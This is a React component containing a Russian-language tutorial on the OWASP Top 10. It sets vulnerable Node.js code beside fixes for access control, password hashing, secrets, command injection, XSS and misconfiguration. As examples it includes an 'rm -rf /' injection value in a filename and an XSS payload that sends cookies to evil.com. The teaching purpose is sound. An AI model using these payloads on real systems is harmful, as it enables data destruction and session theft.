import s from './OwaspArticle.module.scss';
import { VulnExplorer } from './VulnExplorer';
import { QuizBlock } from '@/components/ui/QuizBlock/QuizBlock';
import { QUIZ_QUESTIONS } from './quizData';

export function OwaspArticle() {
  return (
    <div className={s.article}>

      {/* ── 1. Зачем ────────────────────────────────────────────────────────── */}
      <section className={s.section}>
        <h2 className={s.sectionTitle}>OWASP Top 10: почему это важно</h2>
        <p className={s.lead}>
          OWASP Top 10 — список десяти самых критичных уязвимостей веб-приложений,
          обновляемый каждые несколько лет на основе реальных атак. Большинство
          взломов происходит не через 0-day эксплойты, а через банальные ошибки
          в коде, которые в этом списке.
        </p>
        <p className={s.body}>
          Понимание этих уязвимостей обязательно для любого бэкенд-разработчика:
          защита API, работа с пользовательскими данными, аутентификация — везде
          есть стандартные способы всё сломать и стандартные способы это исправить.
        </p>
        <div className={s.tableWrap}>
          <table className={s.table}>
            <thead>
              <tr>
                <th>OWASP 2021</th>
                <th>Уязвимость</th>
                <th>Суть</th>
              </tr>
            </thead>
            <tbody>
              <tr><td>A01</td><td>Broken Access Control</td><td>IDOR, privilege escalation, незащищённые эндпоинты</td></tr>
              <tr><td>A02</td><td>Cryptographic Failures</td><td>Слабые алгоритмы, открытые данные, MD5 для паролей</td></tr>
              <tr><td>A03</td><td>Injection</td><td>SQL, NoSQL, OS Command, XSS инъекции</td></tr>
              <tr><td>A04</td><td>Insecure Design</td><td>Архитектурные проблемы безопасности</td></tr>
              <tr><td>A05</td><td>Security Misconfiguration</td><td>Дефолтные пароли, открытые endpoints, verbose errors</td></tr>
              <tr><td>A07</td><td>Auth Failures</td><td>Brute force, слабые пароли, нет rate limiting</td></tr>
              <tr><td>A10</td><td>SSRF</td><td>Сервер делает запросы на внутренние адреса</td></tr>
            </tbody>
          </table>
        </div>
      </section>

      {/* ── 2. A01 Broken Access Control ────────────────────────────────────── */}
      <section className={s.section}>
        <h2 className={s.sectionTitle}>A01: Broken Access Control</h2>
        <p className={s.lead}>
          Самая распространённая уязвимость в 2021 году — встречается в 94%
          протестированных приложений. Суть: пользователь может получить доступ
          к ресурсам или действиям, которые ему не разрешены.
        </p>

        <p className={s.body}><strong>IDOR — Insecure Direct Object Reference:</strong></p>
        <pre className={s.codeBlock}><code>{`// ❌ Проверяет только "залогинен ли", но не "его ли это заказ"
GET /api/orders/42    // пользователь с id=99 читает чужой заказ

// Уязвимый код:
const order = await db.query('SELECT * FROM orders WHERE id = $1', [id]);

// ✓ Всегда добавляй владельца в WHERE:
const order = await db.query(
  'SELECT * FROM orders WHERE id = $1 AND user_id = $2',
  [id, req.user.sub]   // если чужой — 0 строк → 404
);`}</code></pre>

        <p className={s.body}><strong>Privilege Escalation — повышение прав:</strong></p>
        <pre className={s.codeBlock}><code>{`// ❌ Проверяем аутентификацию, но не роль
app.delete('/api/users/:id', authMiddleware, async (req, res) => {
  await db.query('DELETE FROM users WHERE id = $1', [req.params.id]);
  // Любой залогиненный пользователь может удалить любого!
});

// ✓ Проверяем роль и принадлежность:
app.delete('/api/users/:id', authMiddleware, async (req, res) => {
  const isOwn  = req.params.id === req.user.sub;
  const isAdmin = req.user.role === 'admin';

  if (!isOwn && !isAdmin) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  await db.query('DELETE FROM users WHERE id = $1', [req.params.id]);
  res.status(204).send();
});`}</code></pre>

        <div className={s.callout}>
          <div className={s.calloutLabel}>// Принцип Deny by Default</div>
          <p className={s.calloutText}>
            Всё запрещено по умолчанию. Явно разрешай только нужное.
            При добавлении нового эндпоинта — первый вопрос: «кто должен это видеть?»
            Забытый admin-эндпоинт без авторизации — классический взлом.
          </p>
        </div>
      </section>

      {/* ── 3. A02 Cryptographic Failures ───────────────────────────────────── */}
      <section className={s.section}>
        <h2 className={s.sectionTitle}>A02: Cryptographic Failures</h2>
        <p className={s.lead}>
          Данные передаются в открытом виде, пароли хранятся в MD5, секреты
          лежат в коде. Утечка базы данных с правильно захешированными паролями
          не даёт атакующему ничего. С MD5 — всё.
        </p>

        <p className={s.body}><strong>Хранение паролей — только bcrypt или Argon2:</strong></p>
        <pre className={s.codeBlock}><code>{`const bcrypt = require('bcrypt');

// ❌ MD5, SHA1, SHA256 — быстрые хэши, не для паролей
// GPU перебирает >10 млрд MD5/сек
// MD5("password123") → всегда одинаково → rainbow tables
const hash = crypto.createHash('md5').update(password).digest('hex');

// ✓ bcrypt: специально медленный, встроенная соль
const SALT_ROUNDS = 12;  // 2^12 итераций, ~300ms

// При регистрации:
const hash = await bcrypt.hash(password, SALT_ROUNDS);
await db.query('INSERT INTO users(email, password_hash) VALUES($1,$2)', [email, hash]);

// При входе:
const valid = await bcrypt.compare(inputPassword, storedHash);
// timingSafeEqual внутри — защита от timing attacks
if (!valid) return res.status(401).json({ error: 'Invalid credentials' });`}</code></pre>

        <div className={s.twoCols}>
          <div className={s.colCard}>
            <p className={s.colTitle}>Никогда для паролей</p>
            <ul className={s.colList}>
              <li className={s.colItemBad}>MD5 — 10+ млрд хэшей/сек на GPU</li>
              <li className={s.colItemBad}>SHA1 / SHA256 — тоже быстрые хэши</li>
              <li className={s.colItemBad}>Шифрование (AES) — можно расшифровать</li>
              <li className={s.colItemBad}>Без соли — rainbow tables</li>
            </ul>
          </div>
          <div className={s.colCard}>
            <p className={s.colTitle}>Правильно</p>
            <ul className={s.colList}>
              <li className={s.colItemGood}>bcrypt(12) — ~300ms, встроенная соль</li>
              <li className={s.colItemGood}>Argon2id — победитель Password Hashing Competition</li>
              <li className={s.colItemGood}>scrypt — используется в Node.js crypto</li>
              <li className={s.colItemGood}>Соль уникальная для каждого пользователя</li>
            </ul>
          </div>
        </div>

        <p className={s.body}><strong>Секреты в коде — частая ошибка:</strong></p>
        <pre className={s.codeBlock}><code>{`// ❌ Секреты в коде — попадают в git историю
const JWT_SECRET = 'mysecretkey123';
const DB_PASSWORD = 'postgres';
const STRIPE_KEY = 'sk_live_xxx';

// ✓ Только через переменные окружения
const JWT_SECRET = process.env.JWT_SECRET;
if (!JWT_SECRET) throw new Error('JWT_SECRET is required');

// .env (добавить в .gitignore!)
// JWT_SECRET=<node -e "console.log(require('crypto').randomBytes(32).toString('hex'))">

// Провери репозиторий: git log --all -- .env
// Если secret уже в истории — его нужно считать скомпрометированным`}</code></pre>
      </section>

      {/* ── 4. A03 Injection ────────────────────────────────────────────────── */}
      <section className={s.section}>
        <h2 className={s.sectionTitle}>A03: Injection</h2>
        <p className={s.lead}>
          Данные пользователя интерпретируются как команды: SQL, OS shell, LDAP,
          NoSQL. Параметризованные запросы решают SQL injection полностью. Для
          остальных — экранирование или allowlist.
        </p>

        <p className={s.body}><strong>Command Injection — выполнение произвольных команд:</strong></p>
        <pre className={s.codeBlock}><code>{`const { exec } = require('child_process');

// ❌ Пользовательские данные в shell команде
app.post('/convert', (req, res) => {
  const { filename } = req.body;
  // Атака: filename = "image.jpg; rm -rf /"
  exec(\`convert \${filename} output.png\`, (err, out) => {
    res.send(out);
  });
});

// ✓ execFile с массивом аргументов — shell не задействован
const { execFile } = require('child_process');

app.post('/convert', (req, res) => {
  const { filename } = req.body;

  // Валидировать имя файла: только буквы, цифры, точки, дефисы
  if (!/^[a-zA-Z0-9._-]+$/.test(filename)) {
    return res.status(400).json({ error: 'Invalid filename' });
  }

  // execFile: аргументы передаются как массив, не через shell
  execFile('convert', [filename, 'output.png'], (err, out) => {
    res.send(out);
  });
});`}</code></pre>
      </section>

      {/* ── 5. VulnExplorer ─────────────────────────────────────────────────── */}
      <section className={s.section}>
        <h2 className={s.sectionTitle}>Атака и защита: интерактивный разбор</h2>
        <p className={s.body}>
          Уязвимый код и защищённый вариант рядом. Выбери уязвимость чтобы увидеть
          как именно проводится атака и что конкретно нужно исправить.
        </p>
        <VulnExplorer />
      </section>

      {/* ── 6. XSS ──────────────────────────────────────────────────────────── */}
      <section className={s.section}>
        <h2 className={s.sectionTitle}>XSS: три вида и одна защита</h2>
        <p className={s.body}>
          Cross-Site Scripting — вредоносный скрипт выполняется в браузере жертвы.
          Получает доступ к cookies, localStorage, делает запросы от имени пользователя.
        </p>
        <div className={s.flowSteps}>
          <div className={s.flowStep}>
            <div className={s.stepNum} style={{'--fc': '#ff7b72'} as React.CSSProperties}>①</div>
            <div className={s.stepBody}>
              <span className={s.stepTitle}>Stored XSS — сохранён в БД</span>
              <span className={s.stepDesc}>
                Атакующий сохраняет скрипт в комментарии, профиле, имени. Он выполняется
                у каждого, кто откроет страницу — без клика по ссылке.
              </span>
              <span className={s.stepCode}>{'<script>fetch("evil.com?c="+document.cookie)</script>'}</span>
            </div>
          </div>
          <div className={s.flowStep}>
            <div className={s.stepNum} style={{'--fc': '#f0c040'} as React.CSSProperties}>②</div>
            <div className={s.stepBody}>
              <span className={s.stepTitle}>Reflected XSS — в URL</span>
              <span className={s.stepDesc}>
                Скрипт в URL параметре, сервер отображает его без экранирования.
                Требует чтобы жертва перешла по ссылке.
              </span>
              <span className={s.stepCode}>/search?q={'<script>alert(document.cookie)</script>'}</span>
            </div>
          </div>
          <div className={s.flowStep}>
            <div className={s.stepNum} style={{'--fc': '#9b59e0'} as React.CSSProperties}>③</div>
            <div className={s.stepBody}>
              <span className={s.stepTitle}>DOM-based XSS — на клиенте</span>
              <span className={s.stepDesc}>
                JavaScript на странице читает URL/данные и пишет в innerHTML без
                экранирования. Сервер не задействован — уязвимость в клиентском коде.
              </span>
              <span className={s.stepCode}>{'document.getElementById("out").innerHTML = location.hash.slice(1)'}</span>
            </div>
          </div>
        </div>
        <p className={s.body}><strong>Защита:</strong></p>
        <pre className={s.codeBlock}><code>{`// ✓ React/Vue/Angular: { variable } — автоматическое экранирование
// Избегать dangerouslySetInnerHTML / v-html

// ✓ Content-Security-Policy: запрещает inline скрипты
res.setHeader('Content-Security-Policy', [
  "default-src 'self'",
  "script-src 'self'",   // никаких inline <script>
  "object-src 'none'",
].join('; '));

// ✓ httpOnly cookie — JS не читает, даже при XSS
res.cookie('session', token, { httpOnly: true, secure: true });

// ✓ Если нужен HTML от пользователя — sanitize библиотека:
const clean = DOMPurify.sanitize(userHtml);  // browser
const clean = sanitizeHtml(userHtml, { allowedTags: ['b', 'i', 'a'] });  // server`}</code></pre>
      </section>

      {/* ── 7. Security Misconfiguration ────────────────────────────────────── */}
      <section className={s.section}>
        <h2 className={s.sectionTitle}>A05: Security Misconfiguration</h2>
        <p className={s.body}>
          Типичные ошибки конфигурации — легко допустить, легко не заметить.
        </p>
        <div className={s.pitfallList}>
          <div className={s.pitfall}>
            <p className={s.pitfallTitle}>⚠ Stack trace в production</p>
            <p className={s.pitfallDesc}>
              Express по умолчанию возвращает полный stack trace с путями файлов
              и версиями зависимостей. Это помогает атакующему.
            </p>
            <p className={s.pitfallFix}>✓ Фикс: app.set(&apos;env&apos;, &apos;production&apos;) или NODE_ENV=production. Кастомный error handler без стека.</p>
          </div>
          <div className={s.pitfall}>
            <p className={s.pitfallTitle}>⚠ Дефолтные пароли</p>
            <p className={s.pitfallDesc}>
              MongoDB без auth, Redis без requirepass, admin:admin на панели.
              Первое что проверяет сканер при нахождении открытого порта.
            </p>
            <p className={s.pitfallFix}>✓ Фикс: обязательный пароль, firewall на порты БД (5432, 6379, 27017), bind только на localhost если не нужен внешний доступ.</p>
          </div>
          <div className={s.pitfall}>
            <p className={s.pitfallTitle}>⚠ CORS: Access-Control-Allow-Origin: *</p>
            <p className={s.pitfallDesc}>
              Wildcard CORS + credentials: true — браузер не пошлёт cookies.
              Но Access-Control-Allow-Origin: * означает что любой сайт может
              читать ответы вашего API.
            </p>
            <p className={s.pitfallFix}>✓ Фикс: явный whitelist доменов: origin: [&apos;https://app.com&apos;]</p>
          </div>
          <div className={s.pitfall}>
            <p className={s.pitfallTitle}>⚠ Версии зависимостей не обновляются</p>
            <p className={s.pitfallDesc}>
              Log4Shell, Polyfill.io — уязвимости в зависимостях.
              npm audit показывает известные CVE в текущих версиях.
            </p>
            <p className={s.pitfallFix}>✓ Фикс: npm audit в CI/CD, dependabot/renovabot для автоматических PR с обновлениями.</p>
          </div>
        </div>
      </section>

      {/* ── 8. Auth Failures ────────────────────────────────────────────────── */}
      <section className={s.section}>
        <h2 className={s.sectionTitle}>A07: Authentication Failures</h2>
        <pre className={s.codeBlock}><code>{`const rateLimit = require('express-rate-limit');
const slowDown  = require('express-slow-down');

// ✓ Rate limiting на login — защита от brute force
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 минут
  max: 10,                    // 10 попыток
  message: { error: 'Too many attempts', code: 'RATE_LIMITED' },
  standardHeaders: true,
  legacyHeaders: false,
});

// ✓ Прогрессивная задержка — замедляет перебор
const loginSlowDown = slowDown({
  windowMs: 15 * 60 * 1000,
  delayAfter: 5,      // после 5 попыток:
  delayMs: 500,       // +500ms за каждую следующую
});

app.post('/auth/login', loginLimiter, loginSlowDown, async (req, res) => {
  // ...

  // ✓ Одинаковое сообщение — не раскрывает существование email
  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    return res.status(401).json({ error: 'Invalid credentials' });
    // Не "User not found" или "Wrong password" — разные сообщения
    // помогают атакующему перечислить существующие email
  }
});

// ✓ Требования к паролю — минимальная энтропия важнее сложности
// Минимум 12 символов лучше чем 8 с "спецсимволом"
// Использовать zxcvbn для оценки силы пароля`}</code></pre>
      </section>

      {/* ── 9. Security Headers ─────────────────────────────────────────────── */}
      <section className={s.section}>
        <h2 className={s.sectionTitle}>Security Headers: быстрые wins</h2>
        <p className={s.body}>
          Несколько заголовков дают значительное улучшение безопасности за
          одну строку кода. Используй <code className={s.code}>helmet</code> для Express.
        </p>
        <pre className={s.codeBlock}><code>{`const helmet = require('helmet');
app.use(helmet()); // устанавливает все заголовки ниже автоматически`}</code></pre>
        <div className={s.tableWrap}>
          <table className={s.table}>
            <thead>
              <tr>
                <th>Заголовок</th>
                <th>Что защищает</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td>Strict-Transport-Security</td>
                <td>Принудительный HTTPS, защита от SSL stripping</td>
              </tr>
              <tr>
                <td>Content-Security-Policy</td>
                <td>Разрешённые источники скриптов, защита от XSS</td>
              </tr>
              <tr>
                <td>X-Frame-Options: DENY</td>
                <td>Защита от clickjacking (iframe embedding)</td>
              </tr>
              <tr>
                <td>X-Content-Type-Options: nosniff</td>
                <td>Браузер не угадывает MIME-тип (MIME sniffing)</td>
              </tr>
              <tr>
                <td>Referrer-Policy: no-referrer</td>
                <td>URL страницы не утекает в Referer заголовке</td>
              </tr>
              <tr>
                <td>Permissions-Policy</td>
                <td>Отключить неиспользуемые API (camera, geolocation)</td>
              </tr>
            </tbody>
          </table>
        </div>
        <div className={s.info}>
          <div className={s.infoLabel}>// Проверить заголовки</div>
          <p className={s.infoText}>
            securityheaders.com — бесплатная проверка HTTP заголовков сайта.
            Mozilla Observatory — аудит безопасности с оценкой A–F.
            OWASP ZAP — автоматизированный сканер уязвимостей.
          </p>
        </div>
      </section>

      {/* ── 10. Чеклист ─────────────────────────────────────────────────────── */}
      <section className={s.section}>
        <h2 className={s.sectionTitle}>Чеклист: минимум безопасности</h2>
        <div className={s.twoCols}>
          <div className={s.colCard}>
            <p className={s.colTitle}>Входные данные</p>
            <ul className={s.colList}>
              <li className={s.colItemGood}>Параметризованные SQL запросы</li>
              <li className={s.colItemGood}>Валидация через Zod/Joi — allowlist полей</li>
              <li className={s.colItemGood}>Экранирование HTML при выводе</li>
              <li className={s.colItemGood}>Имена файлов: regex whitelist</li>
              <li className={s.colItemGood}>Размер запроса: express.json({'{'}limit: &apos;100kb&apos;{'}'})</li>
            </ul>
          </div>
          <div className={s.colCard}>
            <p className={s.colTitle}>Аутентификация</p>
            <ul className={s.colList}>
              <li className={s.colItemGood}>bcrypt(12) для паролей</li>
              <li className={s.colItemGood}>Rate limiting на /login</li>
              <li className={s.colItemGood}>JWT_SECRET из crypto.randomBytes(32)</li>
              <li className={s.colItemGood}>httpOnly + Secure + SameSite на cookie</li>
              <li className={s.colItemGood}>Одинаковое сообщение при неверных данных</li>
            </ul>
          </div>
          <div className={s.colCard}>
            <p className={s.colTitle}>Авторизация</p>
            <ul className={s.colList}>
              <li className={s.colItemGood}>Проверять owner при каждом запросе ресурса</li>
              <li className={s.colItemGood}>Deny by default — явный whitelist действий</li>
              <li className={s.colItemGood}>Роли проверять на сервере, не доверять клиенту</li>
              <li className={s.colItemGood}>Логировать неуспешные попытки доступа</li>
            </ul>
          </div>
          <div className={s.colCard}>
            <p className={s.colTitle}>Конфигурация</p>
            <ul className={s.colList}>
              <li className={s.colItemGood}>Секреты только в env, не в коде</li>
              <li className={s.colItemGood}>helmet() для security headers</li>
              <li className={s.colItemGood}>npm audit в CI/CD</li>
              <li className={s.colItemGood}>Нет stack trace в production ответах</li>
              <li className={s.colItemGood}>CORS: конкретные домены, не *</li>
            </ul>
          </div>
        </div>
      </section>

      {/* ── 11. Quiz ────────────────────────────────────────────────────────── */}
      <section className={s.section}>
        <h2 className={s.sectionTitle}>Проверь себя</h2>
        <QuizBlock questions={QUIZ_QUESTIONS} />
      </section>

    </div>
  );
}
